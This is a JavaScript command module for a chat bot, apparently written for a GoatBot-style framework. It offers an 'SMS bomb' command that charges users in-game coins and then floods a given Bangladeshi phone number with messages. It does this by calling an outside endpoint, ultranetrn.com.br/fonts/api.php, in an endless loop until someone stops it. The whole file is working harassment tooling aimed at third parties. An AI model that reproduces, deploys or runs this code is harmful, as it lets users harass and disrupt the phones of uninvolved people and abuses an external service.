const axios = require("axios");
const bombFlag = {};
const lvlStep = 5;

function expToLvl(exp) {
  return Math.floor((1 + Math.sqrt(1 + 8 * exp / lvlStep)) / 2);
}

module.exports = {
  config: {
    name: "sms",
    version: "2.2",
    author: "𝐴𝑠𝑖𝑓 𝑀𝑎ℎ𝑚𝑢𝑑",
    countDown: 0,
    role: 0,
    shortDescription: {
      en: "𝑆𝑀𝑆 𝑏𝑜𝑚𝑏 𝑠𝑒𝑛𝑑"
    },
    longDescription: {
      en: "𝑆𝑡𝑎𝑟𝑡 𝑎 𝑓𝑢𝑛 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏 𝑜𝑛 𝑔𝑖𝑣𝑒𝑛 𝑛𝑢𝑚𝑏𝑒𝑟 (𝑐𝑜𝑠𝑡: 100 𝑐𝑜𝑖𝑛)"
    },
    category: "𝑡𝑜𝑜𝑙",
    guide: {
      en: "𝑠𝑚s 01xxxxxxxxx 𝑜𝑟 𝑠𝑚s 𝑜𝑓𝑓"
    }
  },

  onChat: async function ({ event, message, args, usersData }) {
    const tID = event.threadID;
    const uID = event.senderID;
    const input = args.join(" ").trim();

    if (!input.toLowerCase().startsWith("smx")) return;

    const num = input.split(" ")[1];

    // 🧠 user info
    const uData = await usersData.get(uID);
    const exp = uData.exp || 0;
    const coins = uData.money || 0;
    const lvl = expToLvl(exp);

    // ⛔ lvl check
    if (lvl < 2) {
      return message.reply("🚫 𝑌𝑜𝑢 𝑛𝑒𝑒𝑑 𝑚𝑖𝑛 𝑙𝑣𝑙 2 𝑡𝑜 𝑢𝑠𝑒 𝑡ℎ𝑖𝑠!");
    }

    // 📴 stop bombing
    if (num === "off") {
      if (bombFlag[tID]) {
        bombFlag[tID] = false;
        return message.reply("✅ 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑠𝑡𝑜𝑝𝑝𝑒𝑑.");
      } else {
        return message.reply("❗𝑁𝑜 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑟𝑢𝑛𝑛𝑖𝑛𝑔 𝑖𝑛 𝑡ℎ𝑖𝑠 𝑡ℎ𝑟𝑒𝑎𝑑.");
      }
    }

    // ❌ invalid number
    if (!/^01[0-9]{9}$/.test(num)) {
      return message.reply(
        "📱 𝑃𝑙𝑒𝑎𝑠𝑒 𝑔𝑖𝑣𝑒 𝑎 𝑣𝑎𝑙𝑖𝑑 𝐵𝐷 𝑛𝑢𝑚𝑏𝑒𝑟!\n" +
        "👉 𝐸𝑥: smx 01xxxxxxxxx\n\n" +
        "💸 𝐶𝑜𝑠𝑡 𝑝𝑒𝑟 𝑏𝑜𝑚𝑏: 100 𝑐𝑜𝑖𝑛"
      );
    }

    // 🔁 already bombing
    if (bombFlag[tID]) {
      return message.reply("❗𝐴 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑖𝑠 𝑎𝑙𝑟𝑒𝑎𝑑𝑦 𝑜𝑛. 𝑆𝑡𝑜𝑝 𝑤𝑖𝑡ℎ: smx off");
    }

    // 💸 coin check
    if (coins < 100) {
      return message.reply(`❌ 𝑁𝑜𝑡 𝑒𝑛𝑜𝑢𝑔ℎ 𝑐𝑜𝑖𝑛!\n🔻 𝑁𝑒𝑒𝑑: 100\n🪙 𝐻𝑎𝑣𝑒: ${coins}`);
    }

    // ✅ deduct
    await usersData.set(uID, { money: coins - 100 });

    message.reply(`💥 𝑆𝑀𝑆 𝑏𝑜𝑚𝑏𝑖𝑛𝑔 𝑠𝑡𝑎𝑟𝑡𝑒𝑑 𝑜𝑛 ${num}\n💸 100 𝑐𝑜𝑖𝑛 𝑑𝑒𝑑𝑢𝑐𝑡𝑒𝑑\n🛑 𝑆𝑡𝑜𝑝 𝑤𝑖𝑡ℎ: smx off`);

    bombFlag[tID] = true;

    (async function loopBomb() {
      while (bombFlag[tID]) {
        try {
          await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${num}`);
        } catch (err) {
          message.reply(`❌ 𝐸𝑟𝑟𝑜𝑟: ${err.message}`);
          bombFlag[tID] = false;
          break;
        }
      }
    })();
  },

  onStart: async function () {}
};
